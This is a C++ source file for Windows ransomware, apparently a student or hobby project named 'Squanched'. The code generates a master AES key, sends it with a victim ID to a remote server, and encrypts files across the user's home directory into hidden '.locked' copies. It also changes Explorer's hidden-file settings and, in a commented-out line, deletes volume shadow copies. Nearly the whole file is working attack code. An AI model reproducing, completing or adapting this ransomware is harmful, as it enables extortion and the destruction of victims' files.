#include "Encryption.h"
#include <algorithm>
#include <stdexcept>
#ifdef ENC
#if 0
using namespace boost::filesystem;
using std::string;

void encrypt(string path, const PBYTE masterIV, const PBYTE masterKey);

string get_username();

void send();
void notify();
DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);


DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
void changeHiddenFileState(bool state);
void destroyVSS();



int main(int argc, char* argv[]) {
//	crypt_data* d = generatekey();//TODO also move to encrypt
	PBYTE masterIV, masterKey;
	Status status = generateKeyAndIV(&masterIV, &masterKey);
	string path = ROOT_DIR;
	string pathToID = get_home() + R"(\SquanchedID.id)";
	std::ofstream IDFile;
	PBYTE id = nullptr;
	if (!NT_SUCCESS(status))
	{
		goto CLEAN;
	}
	 id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
	if (NULL == id) {
		goto CLEAN;
	}
	status = BCryptGenRandom(NULL, id, ID_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status))
	{
		goto CLEAN;
	}
	status = sendIVAndKeyToServer(masterIV,masterKey,id);
	if(!NT_SUCCESS(status))
	{
		goto CLEAN;
	}
//	destroyVSS();
	changeHiddenFileState(false);

//	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
//	std::ofstream masterKeyIVFile;
//	masterKeyIVFile.open(pathToMasters, std::ios::binary);
//	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
//	masterKeyIVFile.write((char*)masterIV, IV_LEN);
//	DWORD attributes = GetFileAttributes(pathToMasters.c_str());
//	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
//	masterKeyIVFile.close();
	
	
	IDFile.open(pathToID, std::ios::binary);
	IDFile.write((char*)id, ID_LEN);
	DWORD attributes = GetFileAttributes(pathToID.c_str());
	SetFileAttributes(pathToID.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
	IDFile.close();

	changeHiddenFileState(true);
	
#ifdef DEBUG
	
#else
	string path = get_home();
#endif

//	encrypt(path, masterIV, masterKey);
	iterate(path, &encrypt, masterIV, masterKey);

//#ifdef DEBUG
//	std::cout << "Username: " << get_username() << std::endl;
//	encrypt(d, "./README.md");
//#endif
//
//	send();
//
//	delete d;
//
//	notify();
//

CLEAN:
	if (masterKey)
		HeapFree(GetProcessHeap(), 0, masterKey);
	if (masterIV)
		HeapFree(GetProcessHeap(), 0, masterIV);
	if (id)
		HeapFree(GetProcessHeap(), 0, id);
	return 0;
}






Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id)
{


	DWORD status;
	string strID;
	strID.assign((char*)id, ID_LEN);
	strID = string_to_hex(strID);
	string strMasterIV;
	strMasterIV.assign((char*)masterIV, IV_LEN);
	strMasterIV = string_to_hex(strMasterIV);
	string strMasterKey;
	strMasterKey.assign((char*)masterKey, KEY_LEN);
	strMasterKey = string_to_hex(strMasterKey);
	string str = "ID=";
	str += strID + "&&";
	str += "IV=" + strMasterIV + "&&";
	str += "key=" + strMasterKey;
	status = SendToServer(str);

	
	return status;
}

void destroyVSS()
{
	//ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
}
void changeHiddenFileState(bool state)
{
	SHELLSTATE ss;
	ZeroMemory(&ss, sizeof(ss));
	ss.fShowAllObjects = state;
	ss.fShowSysFiles = state;
	ss.fShowSuperHidden = state;
	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
}
DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
{
	DWORD status;
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle = nullptr;
	status = getKeyHandle(masterKey, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (NULL == tmpIv) {
		HeapFree(GetProcessHeap(), 0, tmpIv);
		return STATUS_UNSUCCESSFUL;
	}
	memcpy(tmpIv, masterIV, IV_LEN);
	DWORD  resSize;

	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
{
	DWORD status = STATUS_INVALID_HANDLE;
	*iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (!(*iv)) {
		return STATUS_UNSUCCESSFUL;
	}
	*key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
	if(!(*key)) {
		return STATUS_UNSUCCESSFUL;
	}
	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenRandom(NULL, *key, KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

bool initPlainText(string path, PBYTE *buffer, size_t buffSize)
{
	std::ifstream plaintextFile;
	plaintextFile.open(path, std::ios::binary);
	if (!plaintextFile.is_open()) {
		return false;
	}
	*buffer = new BYTE[buffSize + 1];
	if(nullptr == *buffer) {
		plaintextFile.close();
		return false;
	}
		
	char c;
	for (size_t i = 0; i < buffSize; ++i) {
		plaintextFile.get(c);
		(*buffer)[i] = c;
	}
	(*buffer)[buffSize] = '\0';
	plaintextFile.close();
	return true;
}

void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, size_t plainTextSize)
{
	unsigned short paddingSize = IV_LEN - (plainTextSize % IV_LEN);
	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; 
	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
	ofile.write((char*)cipherText, cipherLen);
	int size_tot = IV_DIGITS_NUM + KEY_LEN + IV_LEN + cipherLen;
	DWORD attributes = GetFileAttributes((path + LOCKED_EXTENSION).c_str());
	SetFileAttributes((path + LOCKED_EXTENSION).c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
	ofile.close();
	
}

DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
{
	DWORD status;

	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	ULONG res;
	char blockLen[50] ={0};
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
	if (!NT_SUCCESS(status)) {
		std::cout << "BAD KEY HANDLE" << std::endl;
		return status;

	}

	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
{
	if (!do_encrypt(path)) return;
	DWORD status;
	PBYTE plainText = nullptr;
	size_t plainTextLen = getFileSize(path);
	
	PBYTE iv = nullptr;
	PBYTE key = nullptr;

	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle = nullptr;

	PBYTE keyIVBuff = nullptr;
	PBYTE keyIV = nullptr;
	PBYTE cipherText = nullptr;
	if(!initPlainText(path, &plainText, plainTextLen)) {
		goto CLEANUP;
	}

	status = generateKeyAndIV(&iv, &key);
	if(!NT_SUCCESS(status)) {
		goto CLEANUP;
		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
	}
	//keep in persistant file


#ifdef DEBUG
	// Print key and initialization vector
	std::cout << "Key:\t\t" << key << std::endl;
	std::cout << "IV:\t\t" << iv << std::endl;
	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
#endif
	
	status = getKeyHandle(key, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}
	DWORD cipherSize,resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if(NULL == tmpIv) {
		goto CLEANUP;
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	if(NULL == cipherText) {
		goto CLEANUP;
	}
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}
#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif

	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN );
	if(keyIVBuff == nullptr)
	{
		goto CLEANUP;
	}
	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
	if (keyIV == nullptr)
	{
		goto CLEANUP;
	}
	memcpy(keyIV,key,KEY_LEN);
	memcpy(keyIV + KEY_LEN, iv, IV_LEN);
	
	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
	if(!NT_SUCCESS(status))
	{
		goto CLEANUP;
	}
	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
	
CLEANUP:
	if(plainText)
		delete plainText;
	if (iv)
		HeapFree(GetProcessHeap(), 0, iv);
	if (key)
		HeapFree(GetProcessHeap(), 0, key);
	if (aesHandle)
		BCryptCloseAlgorithmProvider(aesHandle, 0);
	if (keyHandle)
		BCryptDestroyKey(keyHandle);
	if (cipherText)
		HeapFree(GetProcessHeap(), 0, cipherText);
	if(keyIV)
		HeapFree(GetProcessHeap(), 0, keyIV);
	if (keyIVBuff)
		HeapFree(GetProcessHeap(), 0, keyIVBuff);
}


//string get_username() {
//#ifdef _WIN32
//	char username[UNLEN + 1];
//	DWORD length = UNLEN + 1;
//	GetUserName(username, &length);
//
//	return string(username);
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_name);
//	}
//
//	return EMPTY;
//#endif
//}
//

//}
//
//void notify() {
//	if (OPEN_FILE) {
//		std::ofstream ofile(NOTIFY_FILENAME);
//		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
//		ofile.close();
//
//		system((string("start ") + NOTIFY_FILENAME).c_str());
//	}
//}
//
//void send() {
//
//}
#endif
#endif